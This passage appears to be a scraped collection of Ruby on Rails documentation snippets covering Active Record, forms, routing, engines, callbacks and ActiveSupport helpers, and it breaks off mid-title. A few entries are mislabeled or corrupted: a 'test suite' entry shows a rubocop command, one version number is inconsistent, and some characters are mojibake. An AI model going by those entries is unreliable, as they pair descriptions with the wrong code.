DESCRIPTION: Demonstrates how to check if a module has a name using the anonymous? predicate method, which returns false for named modules and true for anonymous ones.

LANGUAGE: ruby
CODE:
module M
end
M.name # => "M"

N = Module.new
N.name # => "N"

Module.new.name # => nil

LANGUAGE: ruby
CODE:
module M
end
M.anonymous? # => false

Module.new.anonymous? # => true

LANGUAGE: ruby
CODE:
module M
end

m = Object.send(:remove_const, :M)

m.anonymous? # => false

----------------------------------------

TITLE: Creating a Search Form with GET Method in Rails
DESCRIPTION: Shows how to create a search form that uses the GET method with a custom URL. The example includes a label, search field, and submit button using the form builder.

LANGUAGE: erb
CODE:
<%= form_with url: "/search", method: :get do |form| %>
  <%= form.label :query, "Search for:" %>
  <%= form.search_field :query %>
  <%= form.submit "Search" %>
<% end %>

LANGUAGE: html
CODE:
<form action="/search" accept-charset="UTF-8" method="get">
  <label for="query">Search for:</label>
  <input type="search" name="query" id="query">
  <input type="submit" name="commit" value="Search" data-disable-with="Search">
</form>

----------------------------------------

TITLE: Removing Objects from has_many Collection with delete in Rails
DESCRIPTION: Example of removing an object from a has_many collection by setting its foreign key to NULL. This method can trigger destroy or delete_all depending on dependent option.

LANGUAGE: ruby
CODE:
@author.books.delete(@book1)

----------------------------------------

TITLE: Using backtrace Command in Rails Debugger
DESCRIPTION: Example showing the output of the backtrace command, which displays the execution stack with frame identifiers, call locations, and additional information.

LANGUAGE: ruby
CODE:
=>#0    PostsController#index at ~/projects/rails-guide-example/app/controllers/posts_controller.rb:7
  #1    ActionController::BasicImplicitRender#send_action(method="index", args=[]) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-2.0.alpha/lib/action_controller/metal/basic_implicit_render.rb:6
  #2    AbstractController::Base#process_action(method_name="index", args=[]) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-8.1.0.alpha/lib/abstract_controller/base.rb:214
  #3    ActionController::Rendering#process_action(#arg_rest=nil) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-8.1.0.alpha/lib/action_controller/metal/rendering.rb:53
  #4    block in process_action at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-8.1.0.alpha/lib/abstract_controller/callbacks.rb:221
  #5    block in run_callbacks at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activesupport-8.1.0.alpha/lib/active_support/callbacks.rb:118
  #6    ActionText::Rendering::ClassMethods#with_renderer(renderer=#<PostsController:0x0000000000af78>) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actiontext-8.1.0.alpha/lib/action_text/rendering.rb:20
  #7    block {|controller=#<PostsController:0x0000000000af78>, action=#<Proc:0x00007fd91985f1c0 /Users/st0012/...|} in <class:Engine> (4 levels) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actiontext-8.1.0.alpha/lib/action_text/engine.rb:69
  #8    [C] BasicObject#instance_exec at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activesupport-8.1.0.alpha/lib/active_support/callbacks.rb:127
  ..... and more

----------------------------------------

TITLE: Enabling Cross-Client Caching with Rack::Cache in Rails
DESCRIPTION: Shows how to enable public caching with the stale? method by setting the public option to true, allowing Rack::Cache to store Last-Modified values across client requests.

LANGUAGE: ruby
CODE:
def show
  @post = Post.find(params[:id])

  if stale?(last_modified: @post.updated_at, public: true)
    render json: @post
  end
end

----------------------------------------

TITLE: Fixing Double Render Errors in Rails Controller
DESCRIPTION: An example of code that causes the "Can only render or redirect once per action" error, where multiple render calls occur in a single action without proper flow control.

LANGUAGE: ruby
CODE:
def show
  @book = Book.find(params[:id])
  if @book.special?
    render action: "special_show"
  end
  render action: "regular_show"
end

----------------------------------------

TITLE: Preloading STI Classes in Development Mode
DESCRIPTION: An initializer that ensures Single Table Inheritance (STI) classes are preloaded in development mode for correct behavior of methods like 'subclasses' and 'descendants'.

LANGUAGE: ruby
CODE:
unless Rails.application.config.eager_load
  Rails.application.config.to_prepare do
    types = Shape.unscoped.select(:type).distinct.pluck(:type)
    types.compact.each(&:constantize)
  end
end

----------------------------------------

TITLE: Nested XML Generation with Builder
DESCRIPTION: Example of generating nested XML markup using block syntax in Builder templates.

LANGUAGE: ruby
CODE:
xml.div {
  xml.h1(@person.name)
  xml.p(@person.bio)
}

----------------------------------------

TITLE: Getting Model Name with model_name.name in Rails
DESCRIPTION: Demonstrates retrieving the raw class name of a model using the model_name.name method from ActiveModel::Naming.

LANGUAGE: irb
CODE:
irb> Person.model_name.name
=> "Person"

----------------------------------------

TITLE: Ordering Association Results in Rails
DESCRIPTION: Shows how to specify the order in which associated objects will be retrieved using the order method. This example orders books by confirmation date in descending order.

LANGUAGE: ruby
CODE:
class Author < ApplicationRecord
  has_many :books, -> { order "date_confirmed DESC" }
end

----------------------------------------

TITLE: Implementing around_action callback with a block in Rails
DESCRIPTION: This snippet shows how to use a block with the around_action method. For around_action callbacks, the block receives both the controller and the action as arguments, allowing you to execute code before and after the action.

LANGUAGE: ruby
CODE:
around_action { |_controller, action| time(&action) }

----------------------------------------

TITLE: Implementing derive_class_name Method for Active Record Reflections
DESCRIPTION: This method derives a class name from an association name, using singularize for collection associations. It's used in Active Record reflection mechanisms.

LANGUAGE: ruby
CODE:
def derive_class_name
  class_name = name.to_s.camelize
  class_name = class_name.singularize if collection?
  class_name
end

----------------------------------------

TITLE: Stripping Heredoc Indentation in Ruby
DESCRIPTION: Demonstrates the strip_heredoc method which removes consistent leading whitespace from heredoc strings.

LANGUAGE: ruby
CODE:
if options[:usage]
  puts <<-USAGE.strip_heredoc
    This command does such and such.

    Supported options are:
      -h         This message
      ...
  USAGE
end

----------------------------------------

TITLE: Using Remote Forms with Unobtrusive JavaScript in Rails 3.0
DESCRIPTION: Example of implementing Unobtrusive JavaScript (UJS) with a form_for helper in Rails 3.0. The :remote => true option replaces the old remote_* helpers and generates HTML with data-remote attribute.

LANGUAGE: ruby
CODE:
form_for @post, :remote => true

----------------------------------------

TITLE: Filtering Sensitive Parameters in Rails Logs
DESCRIPTION: Configures Rails to filter sensitive parameters from log files by adding them to the config.filter_parameters array. This prevents sensitive information like passwords from appearing in log files.

LANGUAGE: ruby
CODE:
config.filter_parameters << :password

----------------------------------------

TITLE: Rendering Inline ERB Content in a Controller
DESCRIPTION: Using the :inline option to render ERB directly from a controller without a separate view file, which is generally discouraged as it violates MVC principles.

LANGUAGE: ruby
CODE:
render inline: "<% products.each do |p| %><p><%= p.name %></p><% end %>"

----------------------------------------

TITLE: Finding customer by primary key in Ruby using Active Record
DESCRIPTION: Example of using the find method to retrieve a customer with ID 10, demonstrating the basic Active Record finder functionality.

LANGUAGE: ruby
CODE:
# Find the customer with primary key (id) 10.
irb> customer = Customer.find(10)
=> #<Customer id: 10, first_name: "Ryan">

----------------------------------------

TITLE: Mounting a Rails Engine in Routes
DESCRIPTION: This code snippet shows how to mount the Blorgh engine at a specific path in a Rails application's routes file. The engine becomes accessible at the '/blorgh' path in the application.

LANGUAGE: ruby
CODE:
Rails.application.routes.draw do
  mount Blorgh::Engine => "/blorgh"
end

----------------------------------------

TITLE: Adding Author Name Field to Article Form
DESCRIPTION: Updates the article form partial in the engine to include a text field for author_name, allowing users to input their name when creating articles.

LANGUAGE: html+erb
CODE:
<div class="field">
  <%= form.label :author_name %><br>
  <%= form.text_field :author_name %>
</div>

----------------------------------------

TITLE: Using next_week and prev_week for Week Navigation
DESCRIPTION: Shows how to use next_week and prev_week methods to find dates in adjacent weeks, with options to specify which day of the week to return.

LANGUAGE: ruby
CODE:
d = Date.new(2010, 5, 9) # => Sun, 09 May 2010
d.next_week              # => Mon, 10 May 2010
d.next_week(:saturday)   # => Sat, 15 May 2010

LANGUAGE: ruby
CODE:
d.prev_week              # => Mon, 26 Apr 2010
d.prev_week(:saturday)   # => Sat, 01 May 2010
d.prev_week(:friday)     # => Fri, 30 Apr 2010

----------------------------------------

TITLE: Accessing Custom Error Information
DESCRIPTION: This example shows how to access information from custom errors that were added using errors.add. It demonstrates retrieving the error type and the formatted error message.

LANGUAGE: ruby
CODE:
irb> person = Person.new
irb> person.errors.where(:name).first.type
=> :too_plain
irb> person.errors.where(:name).first.full_message
=> "Name is not cool enough"

----------------------------------------

TITLE: Stripping Heredoc Indentation in Ruby
DESCRIPTION: Demonstrates the strip_heredoc method which removes consistent leading whitespace from heredoc strings.

LANGUAGE: ruby
CODE:
if options[:usage]
  puts <<-USAGE.strip_heredoc
    This command does such and such.

    Supported options are:
      -h         This message
      ...
  USAGE
end

----------------------------------------

TITLE: Configuring X-Sendfile Header for Popular Servers
DESCRIPTION: Configuration options for setting the x_sendfile_header in Rails to support accelerated file sending with different web servers like Apache, lighttpd, and Nginx.

LANGUAGE: ruby
CODE:
# Apache and lighttpd
config.action_dispatch.x_sendfile_header = "X-Sendfile"

# Nginx
config.action_dispatch.x_sendfile_header = "X-Accel-Redirect"

----------------------------------------

TITLE: Demonstrating Single Callback Execution in Console
DESCRIPTION: IRB console example showing how the after_commit callback is only triggered once even when a user is saved multiple times in a single transaction.

LANGUAGE: ruby
CODE:
irb> user = User.create
irb> User.transaction { user.save; user.save }
# User was saved to database

----------------------------------------

TITLE: Adding Custom Preview Paths for Action Mailer in Ruby
DESCRIPTION: Shows how to add additional paths where Rails should look for mailer preview classes, extending the default locations.

LANGUAGE: ruby
CODE:
config.action_mailer.preview_paths << "#{Rails.root}/lib/mailer_previews"

----------------------------------------

TITLE: Automatic Escaping in ERB Templates
DESCRIPTION: Shows how ERB handles automatic escaping of potentially unsafe values when using the <%= %> syntax in Rails views.

LANGUAGE: erb
CODE:
<%= @review.title %> <%# fine, escaped if needed %>

----------------------------------------

TITLE: Registering JSON Patch MIME Type in Rails
DESCRIPTION: Example of registering a MIME type for JSON Patch format in a Rails initializer. This allows Rails to recognize and handle JSON Patch requests properly.

LANGUAGE: ruby
CODE:
# config/initializers/json_patch.rb
Mime::Type.register "application/json-patch+json", :json_patch

----------------------------------------

TITLE: Installing Engine Migrations into a Host Application
DESCRIPTION: Command to copy migrations from an engine into the host application so they can be run against the application's database.

LANGUAGE: bash
CODE:
$ bin/rails blorgh:install:migrations

----------------------------------------

TITLE: Loading Configuration Files in Rails
DESCRIPTION: Shows how to load a YAML configuration file using Rails::Application.config_for in the application configuration.

LANGUAGE: ruby
CODE:
# config/application.rb
module MyApp
  class Application < Rails::Application
    config.payment = config_for(:payment)
  end
end

----------------------------------------

TITLE: Implementing Rails::Server#start Method for Server Initialization in Ruby
DESCRIPTION: The start method of Rails::Server class that handles server initialization, including creating trap signals, directories, setting up caching, and configuring logging.

LANGUAGE: ruby
CODE:
module Rails
  class Server < ::Rackup::Server
    def start(after_stop_callback = nil)
      trap(:INT) { exit }
      create_tmp_directories
      setup_dev_caching
      log_to_stdout if options[:log_stdout]

      super()
      # ...
    end

    private
      def setup_dev_caching
        if options[:environment] == "development"
          Rails::DevCaching.enable_by_argument(options[:caching])
        end
      end

      def create_tmp_directories
        %w(cache pids sockets).each do |dir_to_make|
          FileUtils.mkdir_p(File.join(Rails.root, "tmp", dir_to_make))
        end
      end

      def log_to_stdout
        wrapped_app # touch the app so the logger is set up

        console = ActiveSupport::Logger.new(STDOUT)
        console.formatter = Rails.logger.formatter
        console.level = Rails.logger.level

        unless ActiveSupport::Logger.logger_outputs_to?(Rails.logger, STDERR, STDOUT)
          Rails.logger.broadcast_to(console)
        end
      end
  end
end

----------------------------------------

TITLE: Configuring URL Redirection Filtering in Rails Logs
DESCRIPTION: Example of configuring Rails to filter out specific redirect URLs from application logs. This helps prevent sensitive URLs from appearing in logs by matching against strings or regular expressions.

LANGUAGE: ruby
CODE:
Rails.application.config.filter_redirect += ["s3.amazonaws.com", /private-match/]

----------------------------------------

TITLE: Using Direct and Resolved Routes in Rails 5.1
DESCRIPTION: Shows how to use the new 'resolve' and 'direct' routing methods introduced in Rails 5.1. The 'resolve' method customizes polymorphic mapping of models, while 'direct' creates custom URL helpers.

LANGUAGE: ruby
CODE:
resource :basket

resolve("Basket") { [:basket] }

LANGUAGE: erb
CODE:
<%= form_for @basket do |form| %>
  <!-- basket form -->
<% end %>

LANGUAGE: ruby
CODE:
direct(:homepage) { "https://rubyonrails.org" }

homepage_url # => "https://rubyonrails.org"

LANGUAGE: ruby
CODE:
direct :commentable do |model|
  [ model, anchor: model.dom_id ]
end

direct :main do
  { controller: 'pages', action: 'index', subdomain: 'www' }
end

----------------------------------------

TITLE: Testing Destroy Callbacks in Rails Console
DESCRIPTION: IRB example demonstrating the execution sequence of destroy callbacks when a user record is destroyed. The output shows the verification of admin count, logging before and after the destroy operation, and notification sending.

LANGUAGE: irb
CODE:
irb> user = User.find(1)
=> #<User id: 1, email: "john.doe@example.com", created_at: "2024-03-20 16:19:52.405195000 +0000", updated_at: "2024-03-20 16:19:52.405195000 +0000", name: "John Doe", role: "admin">

irb> user.destroy
Checked the admin count
About to destroy user with ID 1
User with ID 1 destroyed successfully
Notification sent to other users about user deletion

----------------------------------------

TITLE: Running Database Migrations in Dummy Application
DESCRIPTION: Command to run database migrations in the dummy application, creating the necessary tables for testing. This sets up the database schema for the test models.

LANGUAGE: bash
CODE:
$ cd test/dummy
$ bin/rails db:migrate

----------------------------------------

TITLE: Generated HTML for Select Boxes with a Preselected Option
DESCRIPTION: Shows the HTML output for a select box with the Chicago option preselected. The selected="selected" attribute is added to the corresponding option element.

LANGUAGE: html
CODE:
<select name="city" id="city">
  <option value="BE">Berlin</option>
  <option value="CHI" selected="selected">Chicago</option>
  <option value="MD">Madrid</option>
</select>

----------------------------------------

TITLE: Destroying Objects in has_many Collection in Rails
DESCRIPTION: Example of removing an object from a has_many collection by running destroy on the object. This always removes objects from the database regardless of the dependent option.

LANGUAGE: ruby
CODE:
@author.books.destroy(@book1)

----------------------------------------

TITLE: Using underscore with lowerCamelCase in Ruby on Rails
DESCRIPTION: Example showing how underscore handles strings that start with lowercase, useful for converting JavaScript-style naming to Ruby style.

LANGUAGE: ruby
CODE:
"visualEffect".underscore # => "visual_effect"

----------------------------------------

TITLE: Setting up Engine Controller Tests in Ruby
DESCRIPTION: Demonstrates how to set up a functional test for an engine controller without proper route configuration, which may not function correctly because the host application doesn't know how to route requests to the engine.

LANGUAGE: ruby
CODE:
module Blorgh
  class FooControllerTest < ActionDispatch::IntegrationTest
    include Engine.routes.url_helpers

    def test_index
      get foos_url
      # ...
    end
  end
end

----------------------------------------

TITLE: Manual Emulation of autoload_lib_once in Rails <7.1
DESCRIPTION: Shows how to manually configure lib for autoload_once_paths with specific ignored directories in versions of Rails prior to 7.1.

LANGUAGE: ruby
CODE:
# config/application.rb
module MyApp
  class Application < Rails::Application
    lib = root.join("lib")

    config.autoload_once_paths << lib
    config.eager_load_paths << lib

    Rails.autoloaders.once.ignore(
      lib.join("assets"),
      lib.join("tasks"),
      lib.join("generators")
    )

    # ...
  end
end

----------------------------------------

TITLE: Using instance_values Method
DESCRIPTION: Demonstrates the instance_values method which returns a hash mapping instance variable names (without the @ sign) to their values.

LANGUAGE: ruby
CODE:
class C
  def initialize(x, y)
    @x, @y = x, y
  end
end

C.new(0, 1).instance_values # => {"x" => 0, "y" => 1}

----------------------------------------

TITLE: Job Class with Custom Parent Class
DESCRIPTION: Shows the structure of a job class that inherits from a custom parent class (PaymentJob) instead of ApplicationJob.

LANGUAGE: ruby
CODE:
class ProcessPaymentJob < PaymentJob
  queue_as :default

  def perform(*args)
    # Do something later
  end
end

----------------------------------------

TITLE: Testing Initialize and Find Callbacks in Rails Console
DESCRIPTION: IRB example showing how after_initialize and after_find callbacks are triggered in different scenarios. It demonstrates that after_initialize is called for both new objects and loaded records, while after_find is only called when retrieving from the database.

LANGUAGE: irb
CODE:
irb> User.new
You have initialized an object!
=> #<User id: nil>

irb> User.first
You have found an object!
You have initialized an object!
=> #<User id: 1>

----------------------------------------

TITLE: Setting an Encryption Context for a Code Block in Rails
DESCRIPTION: Shows how to use the with_encryption_context method to set a specific encryption context for a block of code, allowing for temporary customization of encryption behavior.

LANGUAGE: ruby
CODE:
ActiveRecord::Encryption.with_encryption_context(encryptor: ActiveRecord::Encryption::NullEncryptor.new) do
  # ...
end

----------------------------------------

TITLE: Running Database Migrations in Rails
DESCRIPTION: Command to execute pending database migrations in a Rails application. This applies any new migration files to update the database schema.

LANGUAGE: bash
CODE:
$ bin/rails db:migrate

----------------------------------------

TITLE: Validating Absence of a Boolean Field
DESCRIPTION: Example showing how to validate the absence of a boolean field. Since false.present? returns false, this uses exclusion instead.

LANGUAGE: ruby
CODE:
validates :field_name, exclusion: { in: [true, false] }

----------------------------------------

TITLE: Spanish Currency Format with Interpolation in YAML
DESCRIPTION: YAML configuration for the Spanish locale defining the product price format with the Euro symbol after the price. Uses proper variable interpolation.

LANGUAGE: yaml
CODE:
# config/locales/es.yml
es:
  product_price: "%{price} â¬"

----------------------------------------

TITLE: Basic String Truncation in Ruby
DESCRIPTION: Demonstrates using the truncate method to limit a string's length, automatically adding ellipsis.

LANGUAGE: ruby
CODE:
"Oh dear! Oh dear! I shall be late!".truncate(20)
# => "Oh dear! Oh dear!..."

----------------------------------------

TITLE: Defining a Route for Controller with Composite Primary Key
DESCRIPTION: Shows how to define a route that can handle composite primary keys in the URL parameter.

LANGUAGE: ruby
CODE:
get "/books/:id", to: "books#show"

----------------------------------------

TITLE: Creating a Book with Author ID without Associations in Ruby on Rails
DESCRIPTION: Code example showing how to create a book for an author without using associations. This requires manually specifying the author_id when creating the book.

LANGUAGE: ruby
CODE:
@book = Book.create(author_id: @author.id, published_at: Time.now)

----------------------------------------

TITLE: Customizing Embedded Images and Attachments HTML
DESCRIPTION: ERB template for customizing the HTML rendered for embedded images and attachments (blobs) in rich text content, including responsive image handling and captions.

LANGUAGE: html+erb
CODE:
<%# app/views/active_storage/blobs/_blob.html.erb %>
<figure class="attachment attachment--<%= blob.representable? ? "preview" : "file" %> attachment--<%= blob.filename.extension %>">
  <% if blob.representable? %>
    <%= image_tag blob.representation(resize_to_limit: local_assigns[:in_gallery] ? [ 800, 600 ] : [ 1024, 768 ]) %>
  <% end %>

  <figcaption class="attachment__caption">
    <% if caption = blob.try(:caption) %>
      <%= caption %>
    <% else %>
      <span class="attachment__name"><%= blob.filename %></span>
      <span class="attachment__size"><%= number_to_human_size blob.byte_size %></span>
    <% end %>
  </figcaption>
</figure>

----------------------------------------

TITLE: Configuring Custom Root Namespaces for Autoloading
DESCRIPTION: Sets up a custom namespace for a directory, allowing app/services files to be defined under the Services module instead of the top-level namespace. Creates the module and configures the autoloader accordingly.

LANGUAGE: ruby
CODE:
# config/initializers/autoloading.rb

# The namespace has to exist.
#
# In this example we define the module on the spot. Could also be created
# elsewhere and its definition loaded here with an ordinary `require`. In
# any case, `push_dir` expects a class or module object.
module Services; end

Rails.autoloaders.main.push_dir("#{Rails.root}/app/services", namespace: Services)

----------------------------------------

TITLE: HTML Output of Custom FormBuilder
DESCRIPTION: Shows the HTML output generated by the custom form builder approaches. All three approaches (helper, custom FormBuilder, and wrapped form_with) generate the same HTML with a label element followed by an input element.

LANGUAGE: html
CODE:
<form action="/people" accept-charset="UTF-8" method="post">
  <!-- ... -->
  <label for="person_first_name">First name</label>
  <input type="text" name="person[first_name]" id="person_first_name">
</form>

----------------------------------------

TITLE: Using parameterize with preserve_case Option in Ruby on Rails
DESCRIPTION: Examples showing how parameterize with preserve_case maintains the original casing while still making the string URL-friendly.

LANGUAGE: ruby
CODE:
"John Smith".parameterize(preserve_case: true) # => "John-Smith"
"Kurt GÃ¶del".parameterize(preserve_case: true) # => "Kurt-Godel"

----------------------------------------

TITLE: Running Rails Test Suite
DESCRIPTION: Command to execute the Rails application test suite, showing test results with timing information.

LANGUAGE: bash
CODE:
$ bin/rubocop

----------------------------------------

TITLE: Advanced String Indentation Options in Ruby
DESCRIPTION: Demonstrates indentation options including custom indent strings and handling of empty lines.

LANGUAGE: ruby
CODE:
"  foo".indent(2)        # => "    foo"
"foo\n\t\tbar".indent(2) # => "\t\tfoo\n\t\t\t\tbar"
"foo".indent(2, "\t")    # => "\t\tfoo"

----------------------------------------

TITLE: Configuring Directory Collapsing for STI Preloading
DESCRIPTION: Setting up directory collapsing for Single Table Inheritance models to eager load them without making them part of a namespace. This allows STI to work correctly with autoloading.

LANGUAGE: ruby
CODE:
# config/initializers/preload_stis.rb

shapes = "#{Rails.root}/app/models/shapes"
Rails.autoloaders.main.collapse(shapes) # Not a namespace.

unless Rails.application.config.eager_load
  Rails.application.config.to_prepare do
    Rails.autoloaders.main.eager_load_dir(shapes)
  end
end

----------------------------------------

TITLE: HTML Safe String with Script Tags in Ruby
DESCRIPTION: Demonstrates that html_safe performs no escaping and just marks a string as trusted, even if it contains potentially dangerous script tags.

LANGUAGE: ruby
CODE:
s = "<script>...</script>".html_safe
s.html_safe? # => true
s            # => "<script>...</script>"

----------------------------------------

TITLE: Running Security Check with Brakeman
DESCRIPTION: Command to perform security vulnerability scanning on a Rails application using the Brakeman gem.

LANGUAGE: bash
CODE:
$ bin/brakeman

----------------------------------------

TITLE: Interacting with Article Model in Rails Console
DESCRIPTION: Demonstrates creating Article instances, counting records, and using the archive method which affects the count by marking articles as archived.

LANGUAGE: irb
CODE:
irb> first = Article.create! title: "Winter is coming", status: "published", published_at: 1.year.ago
irb> second = Article.create! title: "Brace yourself", status: "draft", published_at: 1.month.ago

irb> Article.count
=> 2
irb> first.archive!
irb> Article.count
=> 1

----------------------------------------

TITLE: Installing Rails via Ruby Gems
DESCRIPTION: This snippet demonstrates how to install the Rails framework using Ruby's gem command, which downloads the latest version from RubyGems.org.

LANGUAGE: bash
CODE:
$ gem install rails

----------------------------------------

TITLE: Rendering Comment Form Partial in Article View
DESCRIPTION: ERB code to render a partial form for creating new comments on an article page.

LANGUAGE: html
CODE:
<%= render "blorgh/comments/form" %>

----------------------------------------

TITLE: Blocking All Pages from Search Engine Indexing
DESCRIPTION: Example of a robots.txt file configuration that prevents all search engines from indexing any page of a Rails application.

LANGUAGE: text
CODE:
User-agent: *
Disallow: /

----------------------------------------

TITLE: Finding Descendants with the descendants Method in Ruby
DESCRIPTION: Shows how to use the descendants method to get all classes in a class hierarchy that inherit from a specific class, useful for examining complete class inheritance trees.

LANGUAGE: ruby
CODE:
class C; end
C.descendants # => []

class B < C; end
C.descendants # => [B]

class A < B; end
C.descendants # => [B, A]

class D < C; end
C.descendants # => [B, A, D]

----------------------------------------

TITLE: Disabling Connection Pooling for MemCacheStore in Ruby
DESCRIPTION: Configuration to disable the default connection pooling for MemCacheStore in Rails 7.1+. By default, MemCacheStore and RedisCacheStore now use connection pooling.

LANGUAGE: ruby
CODE:
config.cache_store = :mem_cache_store, "cache.example.com", { pool: false }

----------------------------------------

TITLE: Sample JSON Response from Rails API Application
DESCRIPTION: Example JSON output from a Rails API application showing the format of Group resources. Shows an array of objects with id, name, and timestamps.

LANGUAGE: json
CODE:
[
{"id":1, "name":"Rails Founders", "created_at": ...},
{"id":2, "name":"Rails Contributors", "created_at": ...}
]

----------------------------------------

TITLE: Using try with Database Logging in Ruby on Rails
DESCRIPTION: Real-world example of try from ActiveRecord adapter showing how it avoids nil checks when accessing the logger.

LANGUAGE: ruby
CODE:
def log_info(sql, name, ms)
  if @logger.try(:debug?)
    name = "%s (%.1fms)" % [name || "SQL", ms]
    @logger.debug(format_log_entry(name, sql.squeeze(" ")))
  end
end

----------------------------------------

TITLE: Combining Contextual and Standard Validations in Rails
DESCRIPTION: Shows how standard validations (without context) run alongside context-specific validations when the context is explicitly triggered. This demonstrates that context-specific validations don't replace standard validations.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  validates :email, uniqueness: true, on: :account_setup
  validates :age, numericality: true, on: :account_setup
  validates :name, presence: true
end

----------------------------------------

TITLE: Permitting Destroy Parameter in Strong Parameters
DESCRIPTION: Shows how to update the permitted parameters in a controller to include the _destroy field, which is necessary when allowing destruction of associated records.

LANGUAGE: ruby
CODE:
def person_params
  params.require(:person).
    permit(:name, addresses_attributes: [:id, :kind, :street, :_destroy])
end

----------------------------------------

TITLE: Reloading has_many Collection from Database in Rails
DESCRIPTION: Example of forcing a database read to refresh the collection of associated objects. This returns a Relation with the latest data from the database.

LANGUAGE: ruby
CODE:
@books = @author.books.reload

----------------------------------------

TITLE: Adding Edit Link to Product Show Page in Rails ERB
DESCRIPTION: Updates the product show view to include navigation links for going back to the product list and editing the current product.

LANGUAGE: erb
CODE:
<h1><%= @product.name %></h1>

<%= link_to "Back", products_path %>
<%= link_to "Edit", edit_product_path(@product) %>

----------------------------------------

TITLE: Using Path Helpers in Action Mailer Views (Not Recommended)
DESCRIPTION: Example of using path helpers in mailer views, which is not recommended since email clients don't have web request context and path helpers generate relative URLs that won't work properly in emails.

LANGUAGE: html+erb
CODE:
<%= link_to 'welcome', welcome_path %>

----------------------------------------

TITLE: Running Migration to a Specific Version with Command Line
DESCRIPTION: Command to migrate a database to a specific version by providing the version number to the db:migrate task. This runs all required migrations until it reaches the specified version.

LANGUAGE: bash
CODE:
$ bin/rails db:migrate VERSION=20240428000000

----------------------------------------

TITLE: Configuring Custom Acronyms for Inflections in Ruby on Rails
DESCRIPTION: Example showing how to customize the behavior of inflection methods by defining acronyms that should be preserved in their original form.

LANGUAGE: ruby
CODE:
ActiveSupport::Inflector.inflections do |inflect|
  inflect.acronym "SSL"
end

"SSLError".underscore.camelize # => "SSLError"

----------------------------------------

TITLE: Retrieving the Last Record with Active Record in Ruby on Rails
DESCRIPTION: The last method finds the last record ordered by primary key. It returns nil if no matching record is found and accepts an optional numerical argument to return multiple records.

LANGUAGE: irb
CODE:
irb> customer = Customer.last
=> #<Customer id: 221, first_name: "Russel">

LANGUAGE: sql
CODE:
SELECT * FROM customers ORDER BY customers.id DESC LIMIT 1

LANGUAGE: irb
CODE:
irb> customer = Customer.last
=> #<Customer id: 221, store_id: 1, first_name: "Lifo">

LANGUAGE: sql
CODE:
SELECT * FROM customers ORDER BY customers.store_id DESC, customers.id DESC LIMIT 1

LANGUAGE: irb
CODE:
irb> customers = Customer.last(3)
=> [#<Customer id: 219, first_name: "James">, #<Customer id: 220, first_name: "Sara">, #<Customer id: 221, first_name: "Russel">]

LANGUAGE: sql
CODE:
SELECT * FROM customers ORDER BY customers.id DESC LIMIT 3

LANGUAGE: irb
CODE:
irb> customer = Customer.order(:first_name).last
=> #<Customer id: 220, first_name: "Sara">

LANGUAGE: sql
CODE:
SELECT * FROM customers ORDER BY customers.first_name DESC LIMIT 1

----------------------------------------

TITLE: after_commit Callback Behavior with Multiple Saves
DESCRIPTION: Example demonstrating how after_commit callbacks are only triggered for the first object change within a transaction. The callback will not fire multiple times when the same record is saved multiple times.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  after_commit :log_user_saved_to_db, on: :update

  private
    def log_user_saved_to_db
      Rails.logger.info("User was saved to database")
    end
end

----------------------------------------

TITLE: Checking Attribute Change Values in ActiveModel
DESCRIPTION: Enhanced attribute_changed? method that accepts a hash to check if an attribute was changed from and/or to specific values.

LANGUAGE: ruby
CODE:
attribute_changed?

----------------------------------------

TITLE: Configuring Queue Workers in YAML
DESCRIPTION: Example of a queue.yml configuration file that defines worker settings for production environment. It specifies which queues to process with wildcards, threading parameters, and polling intervals.

LANGUAGE: yaml
CODE:
# config/queue.yml
production:
  workers:
    - queues:[active_storage*, mailers]
      threads: 3
      polling_interval: 5

----------------------------------------

TITLE: Generating Error Messages from Error Objects
DESCRIPTION: This example shows how to generate error messages from error objects using the message and full_message methods. The full_message provides a user-friendly format with the attribute name included.

LANGUAGE: ruby
CODE:
irb> error.message
=> "is too short (minimum is 3 characters)"
irb> error.full_message
=> "Name is too short (minimum is 3 characters)"

----------------------------------------

TITLE: Configuring Engine Routes in a Host Application
DESCRIPTION: Adds the engine's routes to a host application by mounting the engine at a specific path in the application's routes file.

LANGUAGE: ruby
CODE:
mount Blorgh::Engine, at: "/blog"

----------------------------------------

TITLE: Creating Files with file Method
DESCRIPTION: Example of creating files in custom directories using the file method, which accepts a relative path from Rails.root and creates all necessary directories.

LANGUAGE: ruby
CODE:
file "app/components/foo.rb", <<-CODE
  class Foo
  end
CODE

----------------------------------------

TITLE: Rails Controller Inheriting Layout from Parent
DESCRIPTION: Example of a controller that inherits layout settings from its parent controller (ApplicationController).

LANGUAGE: ruby
CODE:
class ArticlesController < ApplicationController
end

----------------------------------------

TITLE: Accessing Custom Logger Instance in Rails 7.1
DESCRIPTION: Shows how to access a custom logger instance through the new BroadcastLogger in Rails 7.1.

LANGUAGE: ruby
CODE:
# config/application.rb
config.logger = MyLogger.new

# Anywhere in your application
puts Rails.logger.class #=> BroadcastLogger
puts Rails.logger.broadcasts #=> [MyLogger]

----------------------------------------

TITLE: Framework Class Decoration in Engine Initializer
DESCRIPTION: This example from turbo-rails shows how an engine can decorate a framework class by including a module. The module reference is stored in the ancestor chain and shouldn't be reloadable.

LANGUAGE: ruby
CODE:
initializer "turbo.broadcastable" do
  ActiveSupport.on_load(:active_record) do
    include Turbo::Broadcastable
  end
end

----------------------------------------

TITLE: Displaying Uploaded Image in Rails View
DESCRIPTION: Demonstrates how to display an uploaded image in a Rails view using image_tag. The conditional check ensures the image is only displayed if one has been attached.

LANGUAGE: erb
CODE:
<%= image_tag @product.featured_image if @product.featured_image.attached? %>

----------------------------------------

TITLE: Demonstrating String#dasherize Method in Ruby on Rails
DESCRIPTION: Examples showing how dasherize replaces underscores with dashes, useful for generating CSS class names or XML element identifiers.

LANGUAGE: ruby
CODE:
"name".dasherize         # => "name"
"contact_data".dasherize # => "contact-data"

----------------------------------------

TITLE: Custom PUT Route Declaration in Rails
